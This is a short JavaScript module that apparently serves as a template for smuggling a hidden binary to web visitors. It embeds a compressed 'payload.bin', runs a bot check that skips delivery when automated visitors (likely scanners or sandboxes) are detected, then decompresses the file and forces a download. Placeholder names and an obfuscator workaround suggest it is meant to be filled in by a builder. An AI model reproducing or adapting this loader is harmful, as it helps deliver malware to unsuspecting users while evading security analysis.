import { load } from "@fingerprintjs/botd";
import { decompressSync, strToU8 } from "fflate";

import payload from "./assets/payload.bin";
import { download as down } from "./utils";

export async function dontChangeFunctionName() {
  // antibot
  if (CONFIG_ANTIBOT) {
    let isBot = false;
    await load({
      monitoring: false,
    })
      .then((botd) => botd.detect())
      .then((result) => {
        // dirty hack to bypass obfuscator renameProperties
        isBot = Object.values(result).some((val) => val === true);
      })
      .catch(() => {});
    if (isBot) {
      return;
    }
  }

  // data decompressing and downloading
  let data = strToU8(payload, true);
  data = CONFIG_COMPRESS ? decompressSync(data) : data;
  down(data, "dont_change_filename_var", "dont_change_content_type_var");
}
